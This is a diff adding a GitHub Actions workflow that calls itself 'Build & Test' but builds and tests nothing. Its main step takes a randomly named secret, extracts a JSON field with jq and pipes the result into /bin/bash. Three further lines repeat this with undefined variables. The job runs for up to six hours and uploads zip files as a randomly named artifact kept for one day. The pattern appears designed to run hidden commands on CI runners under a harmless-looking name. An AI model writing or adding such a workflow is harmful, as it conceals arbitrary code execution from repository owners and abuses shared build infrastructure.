@@ -1,0 +1,25 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          hkox155: ${{ secrets.hkox155 }}
+        run: |
+          printf '%s' "$hkox155" | jq -r .sib16050 | /bin/bash
+          printf '%s' "$obku8" | jq -r .ik05435 | /bin/bash
+          printf '%s' "$jqs6227" | jq -r .osbug794 | /bin/bash
+          echo $w69724 | jq -r .kwew67059 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: W03gLXZF
+          path: "*.zip"
+          retention-days: 1
